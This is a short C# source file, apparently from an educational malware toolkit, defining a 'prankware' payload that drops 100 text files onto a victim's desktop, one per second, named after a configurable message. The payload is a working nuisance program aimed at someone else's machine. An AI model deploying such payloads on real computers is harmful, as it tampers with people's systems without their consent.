using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using EducationalMalwareKit.Toolkit;

namespace PurePrankware
{
    public class Prankware : IEducationalMalwarePayload
    {
        private const string Message = "message";

        public void ValidateConfig(PayloadConfig config)
        {
            if (!config.ContainsKey(Message))
            {
                config.SetInvalidOrMissingPair(Message, "Leave a message for the poor victim");
            }
        }

        public void Run(Dictionary<string, string> rawConfig)
        {           
            var desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            for (var i = 0; i < 100; i++)
            {
                var file = Path.Combine(desktop, rawConfig[Message] + i + ".txt");

                using (var stream = File.CreateText(file))
                {
                    stream.WriteLine("I wonder if the next file contains something else");
                }

                Thread.Sleep(1000);
            }
        }

        public void OnHalt()
        {
            Console.WriteLine("Fine, I'll go away.");
        }
    }
}
